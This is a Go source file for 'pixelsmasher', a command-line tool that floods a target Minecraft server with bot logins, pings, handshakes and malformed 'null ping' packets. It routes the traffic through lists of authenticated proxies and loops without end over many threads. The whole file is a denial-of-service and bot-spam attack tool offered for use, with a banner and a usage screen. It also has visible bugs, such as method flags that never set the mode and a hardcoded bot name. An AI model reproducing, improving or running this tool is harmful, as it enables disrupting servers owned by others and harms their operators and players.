package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"math/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	protocolVersion, threads, cores int
	host, proxyFile, name, modes string
	joiner, pinger, handshake, antibot, pingjoin, bypass, nullping, cps, loginspam bool
	Reset = "\033[0m"
	Red = "\033[31m"
	Yellow = "\033[33m"
	Blue = "\033[34m"
	Magenta = "\033[35m"
	Green = "\033[32m"
	Cyan = "\033[36m"
	)


func main() {
	flag.StringVar(&host, "host", "", "IP of the server")
	flag.StringVar(&name, "name", "Ancient", "Name of the spammed bots")
	flag.IntVar(&protocolVersion, "protocol", 47, "Minecraft protocol version")
	flag.BoolVar(&joiner, "join", false, "join method")
	flag.BoolVar(&handshake, "handshake", false, "handshake method")
	flag.BoolVar(&pinger, "ping", false, "ping method")	
	flag.BoolVar(&nullping, "nullping", false, "null ping method")
	flag.BoolVar(&pingjoin, "pingjoin", false, "pingjoin method")
	flag.IntVar(&threads, "threads", 1, "Number of threads")
	flag.IntVar(&cores, "cores", 1, "Number of CPU cores to use")
	flag.StringVar(&proxyFile, "proxyfile", "proxies.txt", "Proxy file (auth HTTP proxies only)")
	flag.Parse()
	if flag.NFlag() == 0 {
		sendusage()
		return
	}
	runtime.GOMAXPROCS(cores)
	  
	proxies, err := loadProxies(proxyFile)
	if err != nil {
		fmt.Printf("Failed to load proxies: %v\n", err)
		return
	}
	hostParts := strings.Split(host, ":")
	if len(hostParts) != 2 {
		fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
		return
	}
	host = hostParts[0]
	portStr := hostParts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	sendmsg(host, name, proxyFile, port, threads, cores, modes, proxies)
var wg sync.WaitGroup

workChan := make(chan int, threads)
startSignal := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			<-startSignal 
			for index := range workChan {
				rand.Seed(time.Now().UnixNano())
				username := fmt.Sprintf("%s%d", "name", index)
				proxy := proxies[rand.Intn(len(proxies))]
				time.Sleep(time.Microsecond * 100)
				go spam(host, port, username, modes, proxy, protocolVersion)
				}
		}(i)
	}
	close(startSignal)
	for i := 0; ; i++ {
		workChan <- i
	}
	close(workChan)
	wg.Wait()
}
func loadProxies(filePath string) ([]Proxy, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 4 {
			fmt.Println("Wrong proxy type")
			continue
		}
		port, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Printf("Invalid port number %s: %v\n", parts[1], err)
			continue
		}
		proxies = append(proxies, Proxy{
			Host:     parts[0],
			Port:     port,
			Username: parts[2],
			Password: parts[3],
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return proxies, nil
}


type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}

func spam(host string, port int, username string, modes string, proxy Proxy, protocolVersion int) {
			proxyAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password))
	        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", proxy.Host, proxy.Port))
	        if err != nil {
		        return
	        }
			defer conn.Close()
	        connectRequest := fmt.Sprintf(
		        "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n",
		        host, port, host, port, proxyAuth,
	        )
	        conn.Write([]byte(connectRequest))
		        	if modes == "join" {
				        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
				        conn.Write(createLoginPacket(username))
						conn.Close()
				    }else if modes == "ping" {
				        conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
				        conn.Write(createRequestPacket())
						conn.Close()
			        }else if modes == "hand" {
				        conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
						conn.Close()
				    }else if modes == "nullping" {
				        conn.Write(createNullPingPacket())
						conn.Close()
			        }else if modes == "pingjoin" {
						actions := []string{"ping", "join"}
						action := actions[rand.Intn(len(actions))]
							switch action {
								case "ping": {
									conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
									conn.Write(createRequestPacket())
									conn.Close()
								}
								case "join": {
									conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
									conn.Write(createLoginPacket(username))
									conn.Close()
								}
		        			}
					}
}

func writeVarInt(value int) []byte {
	var buffer []byte
	for {
		if value&0xFFFFFF80 == 0 {
			buffer = append(buffer, byte(value))
			break
		}
		buffer = append(buffer, byte(value&0x7F|0x80))
		value >>= 7
	}
	return buffer
}


func createHandshakePacket(host string, port int, nextState int, protocolVersion int) []byte {
	hostBuffer := []byte(host)
	hostLength := writeVarInt(len(hostBuffer))
	portBuffer := []byte{byte(port >> 8), byte(port)}
	nextStateBuffer := writeVarInt(nextState)
	packetID := writeVarInt(0x00)
	protocolBuffer := writeVarInt(protocolVersion)
	packet := append(packetID, protocolBuffer...)
	packet = append(packet, hostLength...)
	packet = append(packet, hostBuffer...)
	packet = append(packet, portBuffer...)
	packet = append(packet, nextStateBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}



func createRequestPacket() []byte {
	packetID := writeVarInt(0x00)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createLoginPacket(username string) []byte {
	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))
	packetID := writeVarInt(0x00)
	packet := append(packetID, usernameLength...)
	packet = append(packet, usernameBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createNullPingPacket() []byte {
	packetID := writeVarInt(0x2B)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createCompressedPacket(packet []byte, threshold int) []byte {
	if len(packet) >= threshold {
		var buffer bytes.Buffer
		writer := zlib.NewWriter(&buffer)
		writer.Write(packet)
		writer.Close()
		return append(writeVarInt(buffer.Len()), buffer.Bytes()...)
	}
	return append(writeVarInt(0), packet...)
}

func readVarInt(reader io.Reader) (int, error) {
    var numRead int
    var result int
    for {
        var byteRead byte
        if err := binary.Read(reader, binary.BigEndian, &byteRead); err != nil {
            return 0, err
        }
        value := byteRead & 0x7F
        result |= int(value) << (7 * uint(numRead)) 

        numRead++
        if numRead > 5 {
            return 0, fmt.Errorf("VarInt is too big: %d bytes read", numRead)
        }
        if byteRead&0x80 == 0 {
            break
        }
    }
    return result, nil
}

func sendusage() {
fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
		fmt.Println("")
		fmt.Println(Blue + "                                     BY hakaneren899 and Randomname" + Reset)
		fmt.Println("")
		fmt.Println("")
		fmt.Println(Yellow + "./pixelsmasher -host <hostname:port> -threads <threads> -protocol <protocol-version> -proxyfile <proxies.txt> -name <botusername> -<methodname>" + Reset)
		fmt.Println("")
		fmt.Println(Green + "Methods:" + Reset)
		fmt.Println("")
		fmt.Println(Green + "1) " + Cyan + "Join" + Reset)
		fmt.Println(Green + "2) " + Cyan + "Ping" + Reset)
		fmt.Println(Green + "3) " + Cyan + "Pingjoin" + Reset)
		fmt.Println(Green + "4) " + Cyan + "Nullping" + Reset)
		fmt.Println(Green + "5) " + Cyan + "Handshake" + Reset)
		fmt.Println("")
		return
}
func sendmsg(host string, name string, proxyFile string, port int, threads int, cores int, modes string, proxies []Proxy) {
fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
	fmt.Println("")
	fmt.Println(Blue + "                                    BY hakaneren899 and Randomname" + Reset)
	fmt.Println("")
	fmt.Println("")
	fmt.Println(Green+"Target IP:"+Magenta, host, port)
	fmt.Println(Green+"Bot Username:"+Magenta, name)
	fmt.Println(Green+"Mode:"+Magenta, modes)
	fmt.Println(Green+"Proxy File:"+Magenta, proxyFile)
	fmt.Println(Green+"Cores Used:"+Magenta, cores)
	fmt.Println(Green+"Threads:"+Magenta, threads)
	fmt.Println(Green+"Proxies Loaded:"+Magenta, len(proxies))
	fmt.Println(Reset)
	return
}